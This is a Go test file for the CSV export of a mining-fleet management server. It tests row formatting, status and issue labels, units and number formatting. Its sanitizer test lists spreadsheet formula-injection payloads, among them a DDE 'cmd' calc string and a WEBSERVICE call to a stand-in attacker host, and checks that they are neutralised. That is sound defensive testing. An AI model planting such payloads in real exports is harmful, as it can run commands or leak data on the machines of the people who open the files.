package fleetmanagement

import (
	"math"
	"testing"
	"time"

	capabilitiespb "github.com/block/proto-fleet/server/generated/grpc/capabilities/v1"
	commonpb "github.com/block/proto-fleet/server/generated/grpc/common/v1"
	pb "github.com/block/proto-fleet/server/generated/grpc/fleetmanagement/v1"
	diagnosticsmodels "github.com/block/proto-fleet/server/internal/domain/diagnostics/models"
	"github.com/stretchr/testify/assert"
	"google.golang.org/protobuf/types/known/timestamppb"
)

func TestBuildMinerCSVRow_FormatsValuesAndIssues(t *testing.T) {
	componentID := "2"
	row := buildMinerCSVRow(
		&pb.MinerStateSnapshot{
			Name:            "Miner A",
			WorkerName:      "worker-01",
			GroupLabels:     []string{"Group 1", "Group 2"},
			RackLabel:       "Rack 1",
			Model:           "S21",
			MacAddress:      "AA:BB:CC:DD:EE:FF",
			IpAddress:       "10.0.0.5",
			DeviceStatus:    pb.DeviceStatus_DEVICE_STATUS_ERROR,
			FirmwareVersion: "v1.2.3",
			Hashrate: []*commonpb.Measurement{{
				Value:     125.4,
				Timestamp: timestamppb.New(time.Unix(1, 0)),
			}},
			Efficiency: []*commonpb.Measurement{{
				Value:     15.2,
				Timestamp: timestamppb.New(time.Unix(1, 0)),
			}},
			PowerUsage: []*commonpb.Measurement{{
				Value:     3.1,
				Timestamp: timestamppb.New(time.Unix(1, 0)),
			}},
			Temperature: []*commonpb.Measurement{{
				Value:     37.5,
				Timestamp: timestamppb.New(time.Unix(1, 0)),
			}},
			Capabilities: &capabilitiespb.MinerCapabilities{
				Telemetry: &capabilitiespb.TelemetryCapabilities{
					EfficiencyReported: true,
					PowerUsageReported: true,
				},
			},
		},
		[]diagnosticsmodels.ErrorMessage{{
			ComponentType: diagnosticsmodels.ComponentTypeFans,
			ComponentID:   &componentID,
		}},
		pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_FAHRENHEIT,
	)

	assert.Equal(t, []string{
		"Miner A",
		"worker-01",
		"Group 1, Group 2",
		"Rack 1",
		"S21",
		"AA:BB:CC:DD:EE:FF",
		"10.0.0.5",
		"Needs attention",
		"Fan 2 failure",
		"125.400",
		"15.200",
		"3.100",
		"99.500",
		"v1.2.3",
	}, row)
}

func TestBuildMinerCSVRow_EmptyRackLabel(t *testing.T) {
	row := buildMinerCSVRow(
		&pb.MinerStateSnapshot{
			DeviceIdentifier: "dev-1",
			DeviceStatus:     pb.DeviceStatus_DEVICE_STATUS_ONLINE,
		},
		nil,
		pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
	)

	assert.Equal(t, "", row[3], "rack column should be empty when no rack is assigned")
}

func TestBuildMinerCSVRow_MissingMetadataUsesDashPlaceholder(t *testing.T) {
	row := buildMinerCSVRow(
		&pb.MinerStateSnapshot{
			DeviceIdentifier: "dev-1",
			DeviceStatus:     pb.DeviceStatus_DEVICE_STATUS_ONLINE,
		},
		nil,
		pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
	)

	assert.Equal(t, "-", row[4], "model should be dash, not '-'")
	assert.Equal(t, "-", row[5], "MAC should be dash, not '-'")
	assert.Equal(t, "-", row[6], "IP should be dash, not '-'")
	assert.Equal(t, "-", row[13], "firmware should be dash, not '-'")
}

func TestBuildExportHeaders_UsesTemperatureUnit(t *testing.T) {
	assert.Equal(t, []string{
		"Name",
		"Worker Name",
		"Groups",
		"Rack",
		"Model",
		"MAC Address",
		"IP Address",
		"Status",
		"Issues",
		"Hashrate (TH/s)",
		"Efficiency (J/TH)",
		"Power (kW)",
		"Temp (°F)",
		"Firmware",
	}, buildExportHeaders(pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_FAHRENHEIT))

	assert.Equal(t, []string{
		"Name",
		"Worker Name",
		"Groups",
		"Rack",
		"Model",
		"MAC Address",
		"IP Address",
		"Status",
		"Issues",
		"Hashrate (TH/s)",
		"Efficiency (J/TH)",
		"Power (kW)",
		"Temp (°C)",
		"Firmware",
	}, buildExportHeaders(pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS))
}

func TestMinerStatusCSVValue(t *testing.T) {
	tests := []struct {
		name     string
		snapshot *pb.MinerStateSnapshot
		errors   []diagnosticsmodels.ErrorMessage
		expected string
	}{
		{
			name:     "offline",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_OFFLINE},
			expected: "Offline",
		},
		{
			name:     "inactive returns sleeping",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_INACTIVE},
			expected: "Sleeping",
		},
		{
			name:     "maintenance returns sleeping",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_MAINTENANCE},
			expected: "Sleeping",
		},
		{
			name: "auth needed overrides inactive to needs attention",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus:  pb.DeviceStatus_DEVICE_STATUS_INACTIVE,
				PairingStatus: pb.PairingStatus_PAIRING_STATUS_AUTHENTICATION_NEEDED,
			},
			expected: "Needs attention",
		},
		{
			name: "auth needed overrides online to needs attention",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus:  pb.DeviceStatus_DEVICE_STATUS_ONLINE,
				PairingStatus: pb.PairingStatus_PAIRING_STATUS_AUTHENTICATION_NEEDED,
			},
			expected: "Needs attention",
		},
		{
			name:     "needs mining pool",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_NEEDS_MINING_POOL},
			expected: "Needs attention",
		},
		{
			name:     "error status",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ERROR},
			expected: "Needs attention",
		},
		{
			name:     "online with errors",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE},
			errors:   []diagnosticsmodels.ErrorMessage{{ComponentType: diagnosticsmodels.ComponentTypeFans}},
			expected: "Needs attention",
		},
		{
			name:     "online no errors returns hashing",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE},
			expected: "Hashing",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.expected, minerStatusCSVValue(tt.snapshot, tt.errors))
		})
	}
}

func TestMinerIssuesCSVValue(t *testing.T) {
	componentID := "3"
	tests := []struct {
		name     string
		snapshot *pb.MinerStateSnapshot
		errors   []diagnosticsmodels.ErrorMessage
		expected string
	}{
		{
			name: "auth needed",
			snapshot: &pb.MinerStateSnapshot{
				PairingStatus: pb.PairingStatus_PAIRING_STATUS_AUTHENTICATION_NEEDED,
			},
			expected: "Authentication required",
		},
		{
			name:     "needs mining pool",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_NEEDS_MINING_POOL},
			expected: "Pool required",
		},
		{
			name:     "no errors",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE},
			errors:   nil,
			expected: "",
		},
		{
			name:     "single typed error with component ID",
			snapshot: &pb.MinerStateSnapshot{},
			errors: []diagnosticsmodels.ErrorMessage{{
				ComponentType: diagnosticsmodels.ComponentTypeFans,
				ComponentID:   &componentID,
			}},
			expected: "Fan 3 failure",
		},
		{
			name:     "multiple errors same type",
			snapshot: &pb.MinerStateSnapshot{},
			errors: []diagnosticsmodels.ErrorMessage{
				{ComponentType: diagnosticsmodels.ComponentTypeHashBoards},
				{ComponentType: diagnosticsmodels.ComponentTypeHashBoards},
			},
			expected: "Multiple hashboard failures",
		},
		{
			name:     "multiple component types",
			snapshot: &pb.MinerStateSnapshot{},
			errors: []diagnosticsmodels.ErrorMessage{
				{ComponentType: diagnosticsmodels.ComponentTypeFans},
				{ComponentType: diagnosticsmodels.ComponentTypePSU},
			},
			expected: "Multiple failures",
		},
		{
			name:     "single unspecified error",
			snapshot: &pb.MinerStateSnapshot{},
			errors:   []diagnosticsmodels.ErrorMessage{{ComponentType: diagnosticsmodels.ComponentTypeUnspecified}},
			expected: "1 issue",
		},
		{
			name:     "multiple unspecified errors",
			snapshot: &pb.MinerStateSnapshot{},
			errors: []diagnosticsmodels.ErrorMessage{
				{ComponentType: diagnosticsmodels.ComponentTypeUnspecified},
				{ComponentType: diagnosticsmodels.ComponentTypeUnspecified},
				{ComponentType: diagnosticsmodels.ComponentTypeUnspecified},
			},
			expected: "3 issues",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.expected, minerIssuesCSVValue(tt.snapshot, tt.errors))
		})
	}
}

func TestFormatDecimal(t *testing.T) {
	tests := []struct {
		value    float64
		expected string
	}{
		{0, "0.000"},
		{1.5, "1.500"},
		{99.99, "99.990"},
		{1234.5, "1234.500"},
		{1234567.8, "1234567.800"},
		{-42.3, "-42.300"},
		{-1234.5, "-1234.500"},
		{math.NaN(), "-"},
		{math.Inf(1), "-"},
		{math.Inf(-1), "-"},
	}

	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			assert.Equal(t, tt.expected, formatDecimal(tt.value))
		})
	}
}

func TestSanitizeCSVField(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"normal text", "normal text"},
		{"", ""},
		{"=SUM(A1:A10)", "'=SUM(A1:A10)"},
		{"+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"},
		{"-1+1", "'-1+1"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tcmd", "'\tcmd"},
		{"\rcmd", "'\rcmd"},
		{"\ncmd", "'\ncmd"},
		{" =1+1", "' =1+1"},
		{"\n=WEBSERVICE(\"https://attacker.invalid\")", "'\n=WEBSERVICE(\"https://attacker.invalid\")"},
		{"\t@SUM(A1)", "'\t@SUM(A1)"},
		{"Miner A", "Miner A"},
		{"192.168.1.1", "192.168.1.1"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			assert.Equal(t, tt.expected, sanitizeCSVField(tt.input))
		})
	}
}

func TestSanitizeOrFallback(t *testing.T) {
	assert.Equal(t, "-", sanitizeOrFallback("", "-"), "empty value returns fallback verbatim")
	assert.Equal(t, "", sanitizeOrFallback("", ""), "empty value with empty fallback")
	assert.Equal(t, "hello", sanitizeOrFallback("hello", "-"), "normal value passes through")
	assert.Equal(t, "'=SUM(A1)", sanitizeOrFallback("=SUM(A1)", "-"), "dangerous value is sanitized")
	assert.Equal(t, "'-foo", sanitizeOrFallback("-foo", "-"), "leading dash in real value is sanitized")
}

func TestTemperatureCSVValue(t *testing.T) {
	tests := []struct {
		name     string
		snapshot *pb.MinerStateSnapshot
		unit     pb.CsvTemperatureUnit
		expected string
	}{
		{
			name:     "offline returns dash",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_OFFLINE},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "-",
		},
		{
			name:     "inactive returns dash",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_INACTIVE},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "-",
		},
		{
			name:     "maintenance returns dash",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_MAINTENANCE},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "-",
		},
		{
			name:     "needs mining pool returns empty",
			snapshot: &pb.MinerStateSnapshot{DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_NEEDS_MINING_POOL},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "",
		},
		{
			name: "auth needed returns empty",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus:  pb.DeviceStatus_DEVICE_STATUS_ONLINE,
				PairingStatus: pb.PairingStatus_PAIRING_STATUS_AUTHENTICATION_NEEDED,
			},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "",
		},
		{
			name: "auth needed with inactive status returns empty not dash",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus:  pb.DeviceStatus_DEVICE_STATUS_INACTIVE,
				PairingStatus: pb.PairingStatus_PAIRING_STATUS_AUTHENTICATION_NEEDED,
			},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "",
		},
		{
			name: "celsius value",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
				Temperature: []*commonpb.Measurement{{
					Value:     65.3,
					Timestamp: timestamppb.New(time.Unix(1, 0)),
				}},
			},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "65.300",
		},
		{
			name: "fahrenheit conversion",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
				Temperature: []*commonpb.Measurement{{
					Value:     0,
					Timestamp: timestamppb.New(time.Unix(1, 0)),
				}},
			},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_FAHRENHEIT,
			expected: "32.000",
		},
		{
			name: "no measurements returns dash",
			snapshot: &pb.MinerStateSnapshot{
				DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
				Temperature:  nil,
			},
			unit:     pb.CsvTemperatureUnit_CSV_TEMPERATURE_UNIT_CELSIUS,
			expected: "-",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.expected, temperatureCSVValue(tt.snapshot, tt.unit))
		})
	}
}

func TestEfficiencyCSVValue(t *testing.T) {
	assert.Equal(t, "N/A", efficiencyCSVValue(&pb.MinerStateSnapshot{
		DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
	}), "nil capabilities")

	assert.Equal(t, "N/A", efficiencyCSVValue(&pb.MinerStateSnapshot{
		DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
		Capabilities: &capabilitiespb.MinerCapabilities{
			Telemetry: &capabilitiespb.TelemetryCapabilities{EfficiencyReported: false},
		},
	}), "efficiency not reported")

	assert.Equal(t, "15.200", efficiencyCSVValue(&pb.MinerStateSnapshot{
		DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
		Efficiency: []*commonpb.Measurement{{
			Value:     15.2,
			Timestamp: timestamppb.New(time.Unix(1, 0)),
		}},
		Capabilities: &capabilitiespb.MinerCapabilities{
			Telemetry: &capabilitiespb.TelemetryCapabilities{EfficiencyReported: true},
		},
	}), "efficiency reported")
}

func TestPowerCSVValue(t *testing.T) {
	assert.Equal(t, "N/A", powerCSVValue(&pb.MinerStateSnapshot{
		DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
	}), "nil capabilities")

	assert.Equal(t, "3.100", powerCSVValue(&pb.MinerStateSnapshot{
		DeviceStatus: pb.DeviceStatus_DEVICE_STATUS_ONLINE,
		PowerUsage: []*commonpb.Measurement{{
			Value:     3.1,
			Timestamp: timestamppb.New(time.Unix(1, 0)),
		}},
		Capabilities: &capabilitiespb.MinerCapabilities{
			Telemetry: &capabilitiespb.TelemetryCapabilities{PowerUsageReported: true},
		},
	}), "power reported")
}

func TestMeasurementCSVValue_AuthNeededOverridesInactive(t *testing.T) {
	snapshot := &pb.MinerStateSnapshot{
		DeviceStatus:  pb.DeviceStatus_DEVICE_STATUS_INACTIVE,
		PairingStatus: pb.PairingStatus_PAIRING_STATUS_AUTHENTICATION_NEEDED,
	}
	assert.Equal(t, "", measurementCSVValue(snapshot, nil), "auth-needed with inactive status should return empty, not dash")
}
